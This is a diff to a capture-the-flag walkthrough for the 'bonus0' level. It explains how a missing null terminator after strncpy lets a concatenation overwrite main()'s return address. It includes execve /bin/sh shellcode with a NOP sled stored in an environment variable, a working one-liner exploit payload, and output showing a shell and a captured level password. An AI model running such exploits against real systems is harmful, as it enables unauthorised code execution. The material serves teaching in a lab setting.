@@ -23,19 +23,19 @@ The first **20 bytes** of said string are copied into the dest buffer used in `p
 
 If the input string is longer than **20 bytes**, the `\0` character is not copied and the string is not `null terminated`.
 
-In the following example the input to **local_34** is **25 bytes** long and the input to **local_20** is **19 bytes** long.
+In the following example the input to **buffer_a** is **25 bytes** long and the input to **buffer_2** is **19 bytes** long.
 
-||**local_34**|**local_20**|
+||**buffer_a**|**buffer_2**|
 |-|-|-|
 |original input|[**25** chars] + '**\n**'|[**19** chars] + '**\n**'|
 |'**cut**' result|[**25** chars] + '**\0**'|[**19** chars] + '**\0**'|
 |**strncpy(20)** result|[**20** chars]|[**19** chars] + '**\0**'|
 
-When **local_34** gets `strcpy()` into **param_1**, it copies both **local_34** and **local_20** since the first string contains no *null byte*. It only stops when it reaches **local_20**'s.
+When **buffer_a** gets `strcpy()` into **main_buffer**, it copies both **buffer_a** and **buffer_2** since the first string contains no *null byte*. It only stops when it reaches **buffer_2**'s.
 
-When **param_1** and **local_20** get concatenated into **output_string**, the result looks like this
+When **main_buffer** and **buffer_2** get concatenated into **output_string**, the result looks like this
 
-`[local_34][local_20][ ][local_20]` instead of the intended `[local_34][ ][local_20]`.
+`[buffer_a][buffer_2][ ][buffer_2]` instead of the intended `[buffer_a][ ][buffer_2]`.
 
 That's all fine and dandy but how can we exploit this ?
 
@@ -46,7 +46,8 @@ We can now indirectly overflow the **output_string** up to `main()` return addre
 We will rewrite this address to redirect to a *shellcode* (the one used in [level2](../level2/walkthrough.md)). This time, the *shellcode* will be stored as an **environnment variable**.
 
 ```sh
-echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" > /tmp/shellcode
+
+python -c "print '\x90' *500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'" > /tmp/shellcode
 export SHELLCODE=$(cat /tmp/shellcode)
 ```
 
@@ -54,7 +55,7 @@ We will use this script provided by a [stackoverflow forum post](https://stackov
 
 ```sh
 # outside the VM
-./tools/inject_file.sh bonus0 level9 bonus0/getenv.c
+./tools/inject_file.sh bonus0 level9/flag bonus0/getenv.c
 
 # inside the VM
 gcc /tmp/getenv.c -o /tmp/getenv
@@ -69,14 +70,20 @@ Our payload must look like this
 
 |read #1|read #2|
 |-|-|
-|**4095** bytes + '\n'|**9** bytes offset + `shellcode address` + **7** bytes of padding|
-
-The 7 bytes of padding are required since *output_string* in `main()` can store up to 54 bytes
+|**4095** bytes + '\n'|**9** bytes offset + `shellcode address` + **10** bytes of padding|
 
 Now we have everything
 ```sh
-(cat <(python -c "print '0' *4095 + '\n' + 'a'*9 + '\xa6\xf8\xff\xbf' + 'a' * 10") -) | ./bonus0
+(cat <(python -c "print '0' *4095 + '\n' + 'a'*9 + '\x0e\xf7\xff\xbf' + 'a' * 10") -) | ./bonus0
 ```
+
+```sh
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
 
 
 NOTE:
@@ -99,4 +106,4 @@ Program received signal SIGSEGV, Segmentation fault.
 
 `0x41336141` == `Aa3A` (converted to big endian).
 
-In the patter it is located at Aa0Aa1Aa2**Aa3A**a4Aa5Aa...
+In the patter it is located at Aa0Aa1Aa2**Aa3A**a4Aa5Aa... So an offset of **9 bytes**.
